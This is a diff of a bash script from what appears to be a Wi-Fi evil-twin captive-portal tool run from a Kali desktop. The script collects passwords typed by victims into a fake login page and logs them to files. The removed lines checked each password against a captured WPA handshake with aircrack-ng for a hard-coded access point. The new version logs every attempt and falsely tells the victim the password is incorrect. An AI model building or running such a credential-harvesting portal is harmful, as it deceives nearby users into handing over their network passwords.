@@ -26,23 +26,19 @@ if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
     "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.post_info.txt"
     echo "${password}" >\
     "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_currentpass.txt"
-    aircrack-ng -a 2 -b E8:DE:27:B0:14:C9 -w "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_currentpass.txt" "/home/kali/Desktop/SimpleWifi/SimpleWifiy/Model/files/handshake-01.cap" | grep "KEY FOUND!" > /dev/null
-    if [ "$?" != "1" ]; then
-        touch "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_success.txt" > /dev/null 2>&1
-        echo 'The password is correct, the connection will be restablished in a few moments'
-        et_successful=1
-    else
-        echo "${password}" >>\
-        "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_attempts.txt"
-        echo 'The password is incorrect, redirecting to the main screen'
-        et_successful=0
-    fi
-    elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
-        echo 'Error. The password must be at least 8 characters. Redirecting to the main screen'
-        et_successful=0
-    else
-        echo 'An unexpected error occurred, redirecting to the main screen'
-        et_successful=0
+
+    echo "${password}" >>\
+    "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_attempts.txt"
+    echo 'The password is incorrect, redirecting to the main screen'
+    et_successful=0
+
+elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
+    echo 'Error. The password must be at least 8 characters. Redirecting to the main screen'
+    et_successful=0
+    
+else
+    echo 'An unexpected error occurred, redirecting to the main screen'
+    et_successful=0
 fi
 
 echo -e '\t\t\t</p></center>'
